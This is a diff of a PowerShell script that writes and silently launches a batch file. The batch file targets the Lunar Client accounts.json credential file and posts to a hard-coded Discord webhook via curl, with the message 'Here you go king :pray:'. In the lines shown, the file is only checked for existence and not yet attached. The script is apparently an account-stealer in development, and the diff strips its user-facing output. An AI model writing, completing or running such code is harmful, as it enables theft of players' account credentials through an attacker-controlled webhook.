@@ -8,43 +8,33 @@ $batchContent = @"
 setlocal enabledelayedexpansion
 
 :: Discord Webhook URL
-set webhookUrl=https:https://discord.com/api/webhooks/1475770175990005811/jFwwFfOqY9AlMr54QfT1B_BPeDHItn5YljgnR9FjjugrBPxKiFmLzTkg9fLrQvoN0-NX
+set webhookUrl=https://discord.com/api/webhooks/1475770175990005811/jFwwFfOqY9AlMr54QfT1B_BPeDHItn5YljgnR9FjjugrBPxKiFmLzTkg9fLrQvoN0-NX
 
-:: Path to the accounts.json file
+:: Check if accounts.json exists
 set filePath=%USERPROFILE%\.lunarclient\settings\game\accounts.json
-
-:: Check if the file exists
 if not exist "%filePath%" (
-    echo File accounts.json does not exist at the specified path.
+    echo accounts.json not found.
     exit /b
 )
 
-:: Prepare message
+:: Message to send
 set message=Here you go king :pray:
 
-:: Escape the payload for the curl request
+:: Escape the message for CURL
 set payload={""content"":""%message%""}
 
-:: Prepare CURL command for sending the request
+:: Send Request
 curl -X POST %webhookUrl% ^
     -H ""Content-Type: application/json"" ^
     -d ""%payload%""
 
-if %errorlevel% neq 0 (
-    echo Failed to send the webhook request.
-) else (
-    echo File sent successfully!
-)
-
+echo Process finished.
 endlocal
 "@
 
-# Write the content to the batch file
+# Create the batch file
 Set-Content -Path $batchFilePath -Value $batchContent
 
-# Output a message to confirm creation
-Write-Host "Batch file created at $batchFilePath"
-
-# Run the batch file automatically
+# Run the batch file
 Start-Process -FilePath $batchFilePath
-Write-Host "Batch file is now running..."
+Write-Host "Webhook message sent."
